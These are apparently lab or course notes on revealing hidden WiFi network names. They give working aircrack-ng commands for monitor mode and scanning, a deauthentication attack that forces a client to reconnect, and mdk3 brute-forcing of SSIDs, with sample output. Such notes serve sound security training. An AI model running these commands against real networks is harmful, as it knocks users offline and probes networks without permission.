___

Set wifi interface to monitor mode

```bash
sudo airmon-ng start wlan0
```

Can for networks

```bash
sudo airodump-ng -c 1 wlan0mon

CH  1 ][ Elapsed: 0 s ][ 2024-05-21 20:45 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:C1:3D:3B:2B:A1  -47   0        9        0    0   1   54   WPA2 CCMP   PSK  <length: 12>                                
 D2:A3:32:13:29:D5  -28   0        9        0    0   1   54   WPA3 CCMP   SAE  <length:  8>                                
 A2:FF:31:2C:B1:C4  -28   0        9        0    0   1   54   WPA2 CCMP   PSK  <length:  4>                                

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29    0 -24      0        4   
```


we can see that there are three hidden SSIDs. The `<length: x>` notation indicates the length of the WiFi network name


#### **Detecting SSID name with Deauth**
we can deauth clients and capture the reconnection requests.

From the above `airodump-ng` scan, we observed that a client with the STATION ID `02:00:00:00:02:00` is connected to the BSSID `B2:C1:3D:3B:2B:A1`. Let's start the `airodump-ng` capture on channel `1` and use `aireplay-ng` to send deauthentication requests to the client.

We should start sniffing our network on `channel 1` with airodump-ng.
```bash
sudo airodump-ng -c 1 wlan0mon
```

In order to force the client to send a probe request, it needs to be disconnected. We can do this with aireplay-ng.

```
sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon
```

After sending the deauthentication requests using `aireplay-ng`, we should see the name of the hidden SSID appear in `airodump-ng` once the client reconnects to the WiFi network. This process leverages the re-association reques

airodump output:
```bash
sudo airodump-ng -c 1 wlan0mon

CH  1 ][ Elapsed: 0 s ][ 2024-05-21 20:45 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:C1:3D:3B:2B:A1  -47   0        9        0    0   1   54   WPA2 CCMP   PSK  jacklighters

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29    0 -24      0        4         jacklighters
```

#### Bruteforcing Hidden SSID

We can use a tool like mdk3 to carry out this attack. With mdk3, we can either provide a wordlist or specify the length of the SSID so the tool can automatically generate potential SSID names.

```bash
mdk3 <interface> <test mode> [test_ options]
```
The `p` test mode argument in mdk3 stands for Basic probing and ESSID Bruteforce mode.

|**Option**|**Description**|
|---|---|
|`-e`|Specify the SSID for probing.|
|`-f`|Read lines from a file for brute-forcing hidden SSIDs.|
|`-t`|Set the MAC address of the target AP.|
|`-s`|Set the speed (Default: unlimited, in Bruteforce mode: 300).|
|`-b`|Use full brute-force mode (recommended for short SSIDs only). This switch is used to show its help screen|
To bruteforce with all possible values, we can use `-b` as the `test_option` in mdk3. We can set the following options for it.

- upper case (u)
- digits (n)
- all printed (a)
- lower and upper case (c)
- lower and upper case plus numbers (m)

```bash
sudo mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4
```

or use a wordlist

```bash
sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5
```

